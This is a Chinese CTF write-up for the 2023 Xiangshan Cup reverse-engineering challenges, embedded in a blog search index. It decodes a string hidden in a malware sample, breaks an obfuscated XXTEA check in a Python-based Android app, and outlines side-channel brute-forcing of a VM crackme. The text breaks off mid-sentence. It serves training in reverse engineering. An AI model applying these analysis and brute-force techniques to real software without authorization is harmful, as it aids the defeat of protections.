<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2023香山杯RE&amp;PWN writeup</title>
    <link href="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/"/>
    <url>/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/</url>
    
    <content type="html"><![CDATA[<h1 id="2023香山杯RE-amp-PWN-writeup"><a href="#2023香山杯RE-amp-PWN-writeup" class="headerlink" title="2023香山杯RE&amp;PWN writeup"></a>2023香山杯RE&amp;PWN writeup</h1><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="URL从哪来"><a href="#URL从哪来" class="headerlink" title="URL从哪来"></a>URL从哪来</h2><p>32位windows恶意软件分析</p><p>微步检测<img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231015153202.png" alt="1"></p><p>题目给的exe又在c盘生成了另一个程序并创建进程，ou.exe可以直接从微步下载，或者根据偏移提取</p><p>分析c盘中真正的恶意程序对数据进行逐位-30和base64加密</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3[0] = 120;<br>v3[1] = 139;<br>v3[2] = 150;<br>v3[3] = 134;<br>v3[4] = 120;<br>v3[5] = 81;<br>v3[6] = 145;<br>v3[7] = 80;<br>v3[8] = 108;<br>v3[9] = 98;<br>v3[10] = 119;<br>v3[11] = 83;<br>v3[12] = 108;<br>v3[13] = 136;<br>v3[14] = 99;<br>v3[15] = 80;<br>v3[16] = 120;<br>v3[17] = 113;<br>v3[18] = 78;<br>v3[19] = 80;<br>v3[20] = 107;<br>v3[21] = 152;<br>v3[22] = 119;<br>v3[23] = 83;<br>v3[24] = 106;<br>v3[25] = 114;<br>v3[26] = 119;<br>v3[27] = 151;<br>v3[28] = 108;<br>v3[29] = 139;<br>v3[30] = 119;<br>v3[31] = 146;<br>v3[32] = 108;<br>v3[33] = 152;<br>v3[34] = 99;<br>v3[35] = 80;<br>v3[36] = 109;<br>v3[37] = 113;<br>v3[38] = 78;<br>v3[39] = 81;<br>v3[40] = 108;<br>v3[41] = 98;<br>v3[42] = 119;<br>v3[43] = 150;<br>v3[44] = 108;<br>v3[45] = 152;<br>v3[46] = 95;<br>v3[47] = 80;<br>v3[48] = 107;<br>v3[49] = 114;<br>v3[50] = 129;<br>v3[51] = 81;<br>v3[52] = 108;<br>v3[53] = 136;<br>v3[54] = 100;<br>v3[55] = 87;<br>v14 = 56;<br>Block = malloc(0x39u);<span class="hljs-built_in"></span><br><span class="hljs-built_in">if </span>( !Block )<br> <span class="hljs-built_in"> return </span>1;<br>memset(Block, 0, v14 + 1);<br>for ( i = 0; i &lt; v14; ++i )<br>  *((_BYTE *)Block + i) = LOBYTE(v3[i]) - 30;<br>v13 = sub_401110((const char *)Block);<br></code></pre></td></tr></table></figure><p>写脚本</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>v3 = [<span class="hljs-number">120</span>, <span class="hljs-number">139</span>, <span class="hljs-number">150</span>, <span class="hljs-number">134</span>, <span class="hljs-number">120</span>, <span class="hljs-number">81</span>, <span class="hljs-number">145</span>, <span class="hljs-number">80</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">152</span>, <span class="hljs-number">119</span>, <span class="hljs-number">83</span>, <span class="hljs-number">106</span>, <span class="hljs-number">114</span>, <span class="hljs-number">119</span>, <span class="hljs-number">151</span>, <span class="hljs-number">108</span>, <span class="hljs-number">139</span>, <span class="hljs-number">119</span>, <span class="hljs-number">146</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">99</span>, <span class="hljs-number">80</span>, <span class="hljs-number">109</span>, <span class="hljs-number">113</span>, <span class="hljs-number">78</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">98</span>, <span class="hljs-number">119</span>, <span class="hljs-number">150</span>, <span class="hljs-number">108</span>, <span class="hljs-number">152</span>, <span class="hljs-number">95</span>, <span class="hljs-number">80</span>, <span class="hljs-number">107</span>, <span class="hljs-number">114</span>, <span class="hljs-number">129</span>, <span class="hljs-number">81</span>, <span class="hljs-number">108</span>, <span class="hljs-number">136</span>, <span class="hljs-number">100</span>, <span class="hljs-number">87</span>]<br><span class="hljs-built_in">block</span> = &#x27;&#x27;<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v3:<br>    <span class="hljs-built_in">block</span> += chr(i-<span class="hljs-number">30</span>)<br><br><span class="hljs-built_in">block</span> = <span class="hljs-built_in">base64</span>.b64decode(<span class="hljs-built_in">block</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">block</span>)<br></code></pre></td></tr></table></figure><h2 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h2><p>chaquopy框架app的逆向</p><p><a href="https://blog.csdn.net/wwb1990/article/details/104051068">https://blog.csdn.net/wwb1990/article/details/104051068</a></p><p>java层找到MainActivity和import导入的b.c.a.a</p><p>这里应该是类似导入python代码，可以推测python文件名应该是hello</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">s</span> <span class="hljs-operator">=</span> Python.getInstance().getModule(<span class="hljs-string">&quot;hello&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这里通过callAttr调用了sayhello函数</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">s.callAttr(<span class="hljs-string">&quot;sayHello&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-built_in">Object</span>[<span class="hljs-number">0</span>]);<br></code></pre></td></tr></table></figure><p>这里应该是监听鼠标点击按钮的事件，触发后跳转到a，即b.c.a.a</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-built_in">this</span>.p.setOnClickListener(<span class="hljs-keyword">new</span> <span class="hljs-type">a</span>(<span class="hljs-built_in">this</span>));<br></code></pre></td></tr></table></figure><p>找到这里，最关键的check函数是python源码中的函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">public void on<span class="hljs-constructor">Click(View <span class="hljs-params">view</span>)</span> &#123;<br>        Context baseContext;<br>        String str;<br>        String obj = this.f717b.r.get<span class="hljs-constructor">Text()</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>;<br>        this.f717b.q.set<span class="hljs-constructor">Text(<span class="hljs-params">obj</span>)</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">MainActivity</span>.</span></span>s.call<span class="hljs-constructor">Attr(<span class="hljs-string">&quot;check&quot;</span>, <span class="hljs-params">obj</span>)</span>.<span class="hljs-keyword">to</span><span class="hljs-constructor">Boolean()</span>) &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;you are right~ flag is flag&#123;your input&#125;&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            baseContext = this.f717b.get<span class="hljs-constructor">BaseContext()</span>;<br>            str = <span class="hljs-string">&quot;Wrong!&quot;</span>;<br>        &#125;<br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Toast</span>.</span></span>make<span class="hljs-constructor">Text(<span class="hljs-params">baseContext</span>, <span class="hljs-params">str</span>, 1)</span>.show<span class="hljs-literal">()</span>;<br>    &#125;<br></code></pre></td></tr></table></figure><p>问了chatgpt，该框架app打包后的python代码位于assets文件夹，但是里面只有.imy文件和so文件，so文件翻了一遍，都不像是有check函数，查看imy文件时发现开头都是PK，可能是压缩包，换后缀名为rar解压发现app.imy中就是hello.py</p><p>代码都是混淆后的，用pycharm对代码进行简单的重命名，如下对check函数进行了简单去混淆，分析可得加密流程是先将字符串四个字节一组小端序转换为int数组，一共36个字符9个int，然后xxtea加密，xxtea的特征有0x9e3779b9，5234的位移，6 + 52，</p><p>这题的xxtea代码和<a href="https://blog.csdn.net/A951860555/article/details/120120400">该博客</a>的一模一样</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> java <span class="hljs-keyword">import</span> jboolean ,jclass <span class="hljs-comment">#line:1</span><br><span class="hljs-keyword">import</span> struct <span class="hljs-comment">#line:3</span><br><span class="hljs-keyword">import</span> ctypes <span class="hljs-comment">#line:4</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span> (O0O00OOO00OO00O00 ,O0OO0O00OO0O000OO ,OO000OO000000O0O0 ,OOO00O00OOO000OOO ,OO0OOO0OOO0OOOO0O ,O0OO000O0000O000O ):<span class="hljs-comment">#line:7</span><br>    OOO000O0O0OO00000 =(O0O00OOO00OO00O00 .value &gt;&gt;<span class="hljs-number">5</span> ^O0OO0O00OO0O000OO .value &lt;&lt;<span class="hljs-number">2</span> )+(O0OO0O00OO0O000OO .value &gt;&gt;<span class="hljs-number">3</span> ^O0O00OOO00OO00O00 .value &lt;&lt;<span class="hljs-number">4</span> )<span class="hljs-comment">#line:8</span><br>    OOO0OOOOOO0O0OO00 =(OO000OO000000O0O0 .value ^O0OO0O00OO0O000OO .value )+(OOO00O00OOO000OOO [(OO0OOO0OOO0OOOO0O &amp;<span class="hljs-number">3</span> )^O0OO000O0000O000O .value ]^O0O00OOO00OO00O00 .value )<span class="hljs-comment">#line:9</span><br>    <span class="hljs-keyword">return</span> ctypes .c_uint32 (OOO000O0O0OO00000 ^OOO0OOOOOO0O0OO00 )<span class="hljs-comment">#line:11</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span> (n, <span class="hljs-built_in">input</span>, key):<span class="hljs-comment">#line:14</span><br>    O0OOO0OO00O0000OO =<span class="hljs-number">0x9e3779b9</span> <span class="hljs-comment">#line:15</span><br>    OOOO0OOOO00O0OOOO = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n <span class="hljs-comment">#line:16</span><br>    O00OO00000O0OO00O =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:18</span><br>    OO0OOOO0O0O0O0OO0 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>])<span class="hljs-comment">#line:19</span><br>    OOOOO00000OOOOOOO =ctypes .c_uint32 (<span class="hljs-number">0</span> )<span class="hljs-comment">#line:20</span><br>    <span class="hljs-keyword">while</span> OOOO0OOOO00O0OOOO &gt;<span class="hljs-number">0</span> :<span class="hljs-comment">#line:22</span><br>        O00OO00000O0OO00O .value +=O0OOO0OO00O0000OO <span class="hljs-comment">#line:23</span><br>        OOOOO00000OOOOOOO .value =(O00OO00000O0OO00O .value &gt;&gt;<span class="hljs-number">2</span> )&amp;<span class="hljs-number">3</span> <span class="hljs-comment">#line:24</span><br>        <span class="hljs-keyword">for</span> OO0O0OOO000O0000O <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (n - <span class="hljs-number">1</span>):<span class="hljs-comment">#line:25</span><br>            OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O + <span class="hljs-number">1</span>])<span class="hljs-comment">#line:26</span><br>            <span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, OO0O0OOO000O0000O, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:27</span><br>            OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [OO0O0OOO000O0000O]<span class="hljs-comment">#line:28</span><br>        OOO0OO00O0OO0O000 =ctypes .c_uint32 (<span class="hljs-built_in">input</span> [<span class="hljs-number">0</span>])<span class="hljs-comment">#line:29</span><br>        <span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]=ctypes .c_uint32 (<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>] + MX (OO0OOOO0O0O0O0OO0, OOO0OO00O0OO0O000, O00OO00000O0OO00O, key, n - <span class="hljs-number">1</span>, OOOOO00000OOOOOOO).value).value <span class="hljs-comment">#line:30</span><br>        OO0OOOO0O0O0O0OO0 .value =<span class="hljs-built_in">input</span> [n - <span class="hljs-number">1</span>]<span class="hljs-comment">#line:31</span><br>        OOOO0OOOO00O0OOOO -=<span class="hljs-number">1</span> <span class="hljs-comment">#line:32</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">input</span> <span class="hljs-comment">#line:34</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span> (<span class="hljs-built_in">input</span>):<span class="hljs-comment">#line:63</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;checking~~~: &quot;</span> + <span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:64</span><br>    <span class="hljs-built_in">input</span> =<span class="hljs-built_in">str</span> (<span class="hljs-built_in">input</span>)<span class="hljs-comment">#line:65</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span> (<span class="hljs-built_in">input</span>)!=<span class="hljs-number">36</span> :<span class="hljs-comment">#line:66</span><br>        <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:67</span><br>    v1 =[]<span class="hljs-comment">#line:69</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">0</span> ,<span class="hljs-number">36</span> ,<span class="hljs-number">4</span> ):<span class="hljs-comment">#line:70</span><br>        result = <span class="hljs-built_in">input</span> [i:i + <span class="hljs-number">4</span>].encode (<span class="hljs-string">&#x27;latin-1&#x27;</span>)<span class="hljs-comment">#line:71          每四字节按latin-1编码</span><br>        v1 .append (result )<span class="hljs-comment">#line:72</span><br>    v2 =[]<span class="hljs-comment">#line:73</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1 :<span class="hljs-comment">#line:74</span><br>        v2 .append (struct .unpack (<span class="hljs-string">&quot;&lt;I&quot;</span>,i )[<span class="hljs-number">0</span> ])<span class="hljs-comment">#line:75 将四字节int按小端序打包</span><br>    <span class="hljs-built_in">print</span> (v2 )<span class="hljs-comment">#line:77</span><br>    result =encrypt (<span class="hljs-number">9</span> ,v2 ,[<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ])<span class="hljs-comment">#line:78</span><br>    chiper =[<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<span class="hljs-comment">#line:85</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">9</span> ):<span class="hljs-comment">#line:86</span><br>        <span class="hljs-keyword">if</span> chiper [i ]!=result [i ]:<span class="hljs-comment">#line:87</span><br>            <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">False</span> )<span class="hljs-comment">#line:88</span><br>    <span class="hljs-keyword">return</span> jboolean (<span class="hljs-literal">True</span> )<span class="hljs-comment">#line:90</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sayHello</span> ():<span class="hljs-comment">#line:92</span><br>    <span class="hljs-built_in">print</span> (<span class="hljs-string">&quot;hello from py&quot;</span>)<span class="hljs-comment">#line:93</span><br></code></pre></td></tr></table></figure><p>脚本，注意解密后需要每四字节转换端序后再转化成字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">MX</span>(<span class="hljs-params">z, y, total, key, p, e</span>):<br>    temp1 = (z.value &gt;&gt; <span class="hljs-number">5</span> ^ y.value &lt;&lt; <span class="hljs-number">2</span>) + (y.value &gt;&gt; <span class="hljs-number">3</span> ^ z.value &lt;&lt; <span class="hljs-number">4</span>)<br>    temp2 = (total.value ^ y.value) + (key[(p &amp; <span class="hljs-number">3</span>) ^ e.value] ^ z.value)<br><br>    <span class="hljs-keyword">return</span> c_uint32(temp1 ^ temp2)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(<span class="hljs-number">0</span>)<br>    z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        total.value += delta<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>):<br>            y = c_uint32(v[p + <span class="hljs-number">1</span>])<br>            v[p] = c_uint32(v[p] + MX(z, y, total, key, p, e).value).value<br>            z.value = v[p]<br>        y = c_uint32(v[<span class="hljs-number">0</span>])<br>        v[n - <span class="hljs-number">1</span>] = c_uint32(v[n - <span class="hljs-number">1</span>] + MX(z, y, total, key, n - <span class="hljs-number">1</span>, e).value).value<br>        z.value = v[n - <span class="hljs-number">1</span>]<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">n, v, key</span>):<br>    delta = <span class="hljs-number">0x9e3779b9</span><br>    rounds = <span class="hljs-number">6</span> + <span class="hljs-number">52</span> // n<br><br>    total = c_uint32(rounds * delta)<br>    y = c_uint32(v[<span class="hljs-number">0</span>])<br>    e = c_uint32(<span class="hljs-number">0</span>)<br><br>    <span class="hljs-keyword">while</span> rounds &gt; <span class="hljs-number">0</span>:<br>        e.value = (total.value &gt;&gt; <span class="hljs-number">2</span>) &amp; <span class="hljs-number">3</span><br>        <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n - <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, -<span class="hljs-number">1</span>):<br>            z = c_uint32(v[p - <span class="hljs-number">1</span>])<br>            v[p] = c_uint32((v[p] - MX(z, y, total, key, p, e).value)).value<br>            y.value = v[p]<br>        z = c_uint32(v[n - <span class="hljs-number">1</span>])<br>        v[<span class="hljs-number">0</span>] = c_uint32(v[<span class="hljs-number">0</span>] - MX(z, y, total, key, <span class="hljs-number">0</span>, e).value).value<br>        y.value = v[<span class="hljs-number">0</span>]<br>        total.value -= delta<br>        rounds -= <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> v<br><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    k = [<span class="hljs-number">12345678</span> ,<span class="hljs-number">12398712</span> ,<span class="hljs-number">91283904</span> ,<span class="hljs-number">12378192</span> ]<br>    n = <span class="hljs-number">9</span><br>    res = [<span class="hljs-number">689085350</span> ,<span class="hljs-number">626885696</span> ,<span class="hljs-number">1894439255</span> ,<span class="hljs-number">1204672445</span> ,<span class="hljs-number">1869189675</span> ,<span class="hljs-number">475967424</span> ,<span class="hljs-number">1932042439</span> ,<span class="hljs-number">1280104741</span> ,<span class="hljs-number">2808893494</span> ]<br>    res = decrypt(n, res, k)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted data is : &quot;</span>, <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">0</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">1</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">2</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">3</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">4</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">5</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">6</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">7</span>]), <span class="hljs-built_in">hex</span>(res[<span class="hljs-number">8</span>]))<br>    v1 = [<span class="hljs-string">b&#x27;\x38\x66\x31\x63&#x27;</span>, <span class="hljs-string">b&#x27;\x36\x65\x63\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x34\x62\x34\x2d&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x34\x2d\x36&#x27;</span>, <span class="hljs-string">b&#x27;\x62\x2d\x31\x33&#x27;</span>, <span class="hljs-string">b&#x27;\x2d\x62\x35\x32&#x27;</span>, <span class="hljs-string">b&#x27;\x31\x30\x31\x61&#x27;</span>, <span class="hljs-string">b&#x27;\x39\x38\x61\x30&#x27;</span>, <span class="hljs-string">b&#x27;\x32\x39\x35\x63&#x27;</span>]<br>    v2 = []  <br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> v1:  <br>        v2.append(struct.unpack(<span class="hljs-string">&quot;&lt;I&quot;</span>, i)[<span class="hljs-number">0</span>])<br>    <span class="hljs-built_in">print</span>(v2)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(v2[i]),end=<span class="hljs-string">&#x27; &#x27;</span>)<br>  <span class="hljs-comment">#63316638616365362d346234362d343933312d623235622d613130313061383963353932</span><br>    asc = <span class="hljs-string">&#x27;63316638616365362d346234362d343933312d623235622d613130313061383963353932&#x27;</span><br>    <span class="hljs-built_in">str</span> = binascii.unhexlify(asc)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br></code></pre></td></tr></table></figure><h2 id="nesting"><a href="#nesting" class="headerlink" title="nesting"></a>nesting</h2><p>虚拟机逆向</p><p>vm题的一些思路</p><p>1.还原结构体和switch跳表，读懂vm代码，写代码将opcode转化成汇编指令语句然后再逆向汇编代码，这种方法效率最低，做一题需要很久，像这次比赛两个小时肯定不够，除非做到过类似的。</p><p>2.软件分析工具和脚本。</p><p>3.爆破。主要用于程序对flag(input)的检测是逐位的情况下，每一位的对错都会导致执行流的改变，执行时间或执行指令数量相差巨大，这样就能进行侧信道逐位爆破。战队里大佬用侧信道的方式爆破出来了，学习一下。</p><p>首先来逆向代码</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214727.png"></p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019214759.png"></p><p>run_vm中的代码比较混乱，主要原因是将a1识别成了数组，并将swtich语句识别成了if-else语句，需要创建结构体对a1进行重定义并恢复switch跳表</p><p>tips:ida7.7及以上可以识别出switch语句，不需要手动恢复</p><p><a href="https://blog.csdn.net/hgy413/article/details/7104304">ida创建结构体参考</a>       <a href="https://blog.csdn.net/huzai9527/article/details/121204850">ida修复switch跳表参考</a></p><p>跳表修复时Default jump address不设定好的话，会出现多余的case</p><p>结构体创建完后将run_vm函数的指向opcode的参数定义成刚刚创建的结构体(选中,右键, Convert to struct)</p><p>修复前</p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ截图20231019222157.png" alt style="zoom:50%;"><p>修复后</p><p><img src="/2023/10/18/2023%E9%A6%99%E5%B1%B1%E6%9D%AFwp/QQ%E6%88%AA%E5%9B%BE20231019223303-1697726007256.png"></p><p>现在代码就比较美观了，但是虚拟机的逻辑还是很复杂,所以不逆了</p><p>程序运行后会让你输入flag并检测flag是否正确</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">Input</span> your flag:<br></code></pre></td></tr></table></figure><p>这里用sde来统计程序运行到的指令数量，结果会在命令行以ICOUNT: 